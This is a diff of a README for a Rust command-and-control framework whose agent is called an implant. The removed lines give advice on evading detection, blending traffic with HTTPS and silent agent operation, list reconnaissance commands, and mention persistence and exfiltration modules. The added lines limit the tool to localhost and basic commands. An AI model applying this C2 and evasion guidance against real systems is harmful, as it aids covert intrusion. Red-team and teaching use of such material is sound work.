@@ -37,15 +37,15 @@ A sophisticated Command and Control (C2) framework implementation designed for s
 ### Installation & Setup
 
 ```bash
-# Clone or create project
-git clone  https://github.com/ManU4kym/c2-implementation.git
-cd advanced-c2-utility
+# Clone project
+git clone https://github.com/ManU4kym/c2-implementation.git
+cd c2-utility
 
 # Build in release mode for optimal performance
 cargo build --release
 
 # Verify build
-./target/release/c2-util --help
+./target/release/c2-utility --help
 ```
 
 ### Deployment Scenarios
@@ -54,27 +54,19 @@ cargo build --release
 
 ```bash
 # Standard deployment (port 4444)
-./target/release/c2-util server 4444
-
-# Production deployment with specific interface
-./target/release/c2-util server 0.0.0.0:8443
-
-# Docker deployment
-docker build -t c2-server .
-docker run -p 4444:4444 c2-server
+cargo run -- server 4444
+# Or use compiled binary
+./target/release/c2-utility server 4444
 ```
 
 #### 📱 Agent Deployment (Implant)
 
 ```bash
-# Connect to C2 server
-./target/release/c2-util agent 192.168.1.100:4444
+# Connect to C2 server on localhost
+cargo run -- agent 127.0.0.1:4444
 
-# Silent operation (background)
-./target/release/c2-util agent 192.168.1.100:4444 --silent
-
-# With custom check-in interval
-./target/release/c2-util agent 192.168.1.100:4444 --interval 30
+# Or use compiled binary
+./target/release/c2-utility agent 127.0.0.1:4444
 ```
 
 ---
@@ -109,233 +101,108 @@ docker run -p 4444:4444 c2-server
 
 ```bash
 # Start server
-c2-util server 4444
+cargo run -- server 4444
 
 # Available console commands:
-c2> agents                    # List connected agents
-c2> task <agent_id> <command> # Execute command on agent
-c2> tasks <agent_id>          # View command results
-c2> kill <agent_id>           # Terminate agent connection
-c2> config                    # Show server configuration
-c2> help                      # Display help
-c2> exit                      # Graceful shutdown
+c2> agents              # List all connected agents
+c2> task <agent_id> <cmd>  # Send command to agent
+c2> tasks <agent_id>    # View pending tasks
+c2> help                # Display available commands
+c2> exit                # Shutdown server gracefully
+```
+
+### Supported Agent Commands
+
+```bash
+# System Information
+c2> task agent_1 sysinfo      # Display system info (OS, hostname, user, agent ID)
+c2> task agent_1 whoami        # Show current username
+c2> task agent_1 hostname      # Display hostname
+
+# File & Directory Operations
+c2> task agent_1 pwd           # Print working directory
+c2> task agent_1 ls            # List directory contents
+c2> task agent_1 dir           # Windows alias for ls
+c2> task agent_1 cat <file>    # Read file contents
+c2> task agent_1 cd <path>     # Change working directory
+
+# Utilities
+c2> task agent_1 echo <text>   # Echo text
+c2> task agent_1 sleep <sec>   # Sleep for N seconds
+c2> task agent_1 help          # Show agent help
 ```
 
 ### Example Operational Flow
 
-1. **Initial Setup**
-
 ```bash
 # Terminal 1 - Start C2 Server
-./target/release/c2-util server 4444
+cargo run -- server 4444
 
-# Terminal 2 - Deploy Agent
-./target/release/c2-util agent 127.0.0.1:4444
+# Terminal 2 - Deploy Agent (after server is ready)
+cargo run -- agent 127.0.0.1:4444
 ```
 
-2. **Agent Management**
+### Interactive Console Example
 
-```bash
-# List connected agents
+```
 c2> agents
+╔════════════════════════════════════════╗
+║           Connected Agents             ║
+╠════════════════════════════════════════╣
+║ ID: agent_1763062325                   ║
+║ Address: 127.0.0.1:54321               ║
+║ User: emman@PORCUPINE (windows)         ║
+╚════════════════════════════════════════╝
 
-# Execute reconnaissance commands
-c2> task agent_abc sysinfo
-c2> task agent_abc "whoami /groups"
-c2> task agent_abc "ipconfig /all"
+c2> task agent_1763062325 sysinfo
+[*] Task sent to agent_1763062325: sysinfo
 
-# Review results
-c2> tasks agent_abc
-```
-
-### Command Examples
-
-#### System Reconnaissance
-
-```bash
-c2> task <agent> systeminfo
-c2> task <agent> netstat -an
-c2> task <agent> wmic logicaldisk get size,freespace,caption
-```
-
-#### Network Discovery
-
-```bash
-c2> task <agent> arp -a
-c2> task <agent> net view
-c2> task <agent> nslookup <target>
+c2> tasks agent_1763062325
+[<] Response: OS: windows...
 ```
 
 ---
 
 ## 🔒 Security Considerations
 
-### Operational Security
+### Current Implementation Features
 
-- **Traffic Patterns** - Communications resemble normal HTTPS traffic
-- **Encryption** - All data encrypted in transit
-- **Authentication** - Agent verification through cryptographic keys
-- **Cleanup** - No persistent artifacts without explicit configuration
+- **End-to-End Encryption** - AES-256-GCM for all communications
+- **Secure Key Exchange** - Random session key generation per connection
+- **Message Authentication** - Integrity verification built into AES-GCM
+- **Multi-threaded Architecture** - Safe concurrent agent handling with Arc/Mutex
 
-### Deployment Security
+### Deployment Recommendations
 
-```bash
-# Recommended production settings
-./target/release/c2-util server \
-  --port 443 \           # Blend with HTTPS
-  --interface 0.0.0.0 \  # Listen on all interfaces
-  --timeout 30 \         # Connection timeout
-  --max-agents 100       # Resource limits
-```
+- Use on authorized test systems only
+- Deploy with firewall rules restricting access
+- Monitor port activity (default: 4444)
+- Use non-standard ports in production environments
+- Implement network segmentation
 
-### Detection Avoidance
+### Known Limitations
 
-- Use standard ports (443, 80, 53)
-- Implement jitter in check-in times
-- Encrypt all communications
-- Clean up temporary files
-
----
-
-## 📊 Monitoring & Logging
-
-### Server Logs
-
-```bash
-# Enable verbose logging
-RUST_LOG=debug ./target/release/c2-util server 4444
-
-# Log locations
-/var/log/c2-server/access.log
-/var/log/c2-server/error.log
-/var/log/c2-server/agent_activity.log
-```
-
-### Agent Activity Monitoring
-
-- Connection timestamps
-- Command execution logs
-- Data transfer volumes
-- Error rates and patterns
+- Single-user interactive console (no multi-user support)
+- No persistence mechanisms
+- No anti-analysis features
+- Commands are platform-specific (currently optimized for Windows/Linux)
 
 ---
 
 ## 🛠️ Troubleshooting
 
-### Common Issues
+### Connection Issues
 
-**Connection Failures**
+- **Agent can't connect**: Verify server is running (`cargo run -- server 4444`)
+- **Firewall blocking**: Allow TCP port 4444 in Windows Firewall
+- **Timeout errors**: Ensure both processes have proper network connectivity
+- **Registration fails**: Check server console for error messages
 
-```bash
-# Check firewall rules
-sudo ufw status
-sudo iptables -L
+### Agent Disconnection
 
-# Verify port listening
-netstat -tulpn | grep 4444
-ss -tulpn | grep 4444
-```
-
-**Agent Registration Issues**
-
-```bash
-# Check server connectivity
-telnet <server_ip> 4444
-
-# Verify encryption keys
-# Check system time synchronization
-```
-
-**Performance Issues**
-
-```bash
-# Monitor server resources
-htop
-iotop -o
-
-# Check network bandwidth
-nethogs
-```
-
-### Debug Mode
-
-```bash
-# Enable debug output
-RUST_LOG=debug ./target/release/c2-util server 4444
-
-# Agent debug mode
-./target/release/c2-util agent <server> --debug
-```
-
----
-
-## 🔄 Maintenance & Updates
-
-### Regular Maintenance Tasks
-
-- Rotate encryption keys periodically
-- Update agent binaries for detection avoidance
-- Review and archive logs
-- Update firewall rules as needed
-
-### Version Management
-
-```bash
-# Check current version
-./target/release/c2-util --version
-
-# Update procedure
-git pull origin main
-cargo build --release
-systemctl restart c2-server
-```
-
----
-
-## 📈 Performance Optimization
-
-### Server Tuning
-
-```bash
-# Optimized build
-RUSTFLAGS="-C target-cpu=native" cargo build --release
-
-# System limits
-echo 'net.core.somaxconn=65535' >> /etc/sysctl.conf
-echo 'net.ipv4.tcp_max_syn_backlog=65535' >> /etc/sysctl.conf
-```
-
-### Resource Monitoring
-
-- CPU usage per connected agent
-- Memory consumption trends
-- Network bandwidth utilization
-- Disk I/O for logging
-
----
-
-## ⚖️ Compliance & Legal
-
-### Usage Guidelines
-
-- ✅ Authorized penetration testing
-- ✅ Internal security research
-- ✅ Educational purposes
-- ✅ Controlled lab environments
-
-### Restrictions
-
-- ❌ Unauthorized access to systems
-- ❌ Production environment testing without approval
-- ❌ Malicious activities
-- ❌ Violation of terms of service
-
-### Documentation Requirements
-
-- Maintain testing authorization letters
-- Document all testing activities
-- Preserve evidence of authorized use
-- Follow responsible disclosure practices
+- Agent will disconnect if server closes or network fails
+- Restart agent after server is ready
+- Check for error messages in console output
 
 ---
 
@@ -343,66 +210,40 @@ echo 'net.ipv4.tcp_max_syn_backlog=65535' >> /etc/sysctl.conf
 
 ### Documentation
 
-- [Technical Specification](docs/technical.md)
-- [API Reference](docs/api.md)
-- [Deployment Guide](docs/deployment.md)
-- [Troubleshooting Guide](docs/troubleshooting.md)
+- Main implementation: `src/main.rs`
+- Architecture: Multi-threaded TCP server with encrypted agent communication
+- Protocol: Custom JSON-based message format with AES-256-GCM encryption
 
-### Community
+### Learning Resources
 
-- [Security Research Forum](https://example.com/forum)
-- [Issue Tracker](https://github.com/example/c2-util/issues)
-- [Wiki Documentation](https://github.com/example/c2-util/wiki)
-
-### Training Resources
-
-- C2 Operations Course
-- Red Team Methodology Guide
-- Detection Evasion Techniques
-- Incident Response Procedures
+- Study `c2.md` (local file) for Rust concepts used in this project
+- Review the code for examples of:
+  - Multi-threading with Arc/Mutex
+  - TCP socket programming
+  - Cryptographic operations
+  - Serialization with serde
+  - Error handling patterns
 
 ---
 
-## 🎯 Advanced Features
+## 📝 Project Status
 
-### Plugin System
+### Current Features ✅
 
-```bash
-# Load additional modules
-c2> load module persistence
-c2> load module exfiltration
-c2> load module evasion
-```
+- Multi-agent C2 server
+- Encrypted agent-server communication (AES-256-GCM)
+- Interactive console for operator commands
+- 9 built-in agent commands (sysinfo, whoami, hostname, pwd, ls, dir, cat, cd, echo, sleep)
+- Proper timeout handling for Windows compatibility
+- Multi-threaded concurrent agent handling
 
-### Integration Capabilities
+### Planned Enhancements
 
-- SIEM integration (Splunk, Elasticsearch)
-- SOAR platform connectivity
-- Custom web interfaces
-- API endpoints for automation
-
----
-
-## 📝 Changelog
-
-### Version 1.0.0
-
-- Initial release with core C2 functionality
-- AES-256-GCM encryption
-- Multi-agent support
-- Interactive console interface
-
-### Planned Features
-
-- [ ] Web-based management console
-- [ ] Additional transport protocols (HTTP, DNS)
-- [ ] Cross-platform agent support
-- [ ] Automated persistence mechanisms
-- [ ] Built-in reconnaissance modules
-
----
-
-> **Important**: Always operate within authorized boundaries and comply with all applicable laws and regulations. Maintain proper documentation for all testing activities.
+- Additional command support (execute arbitrary shell commands)
+- Persistent configuration
+- Agent auto-restart on failure
+- Web-based management interface
+- Cross-platform agent support (currently Windows/Linux optimized)
 
 ```
 
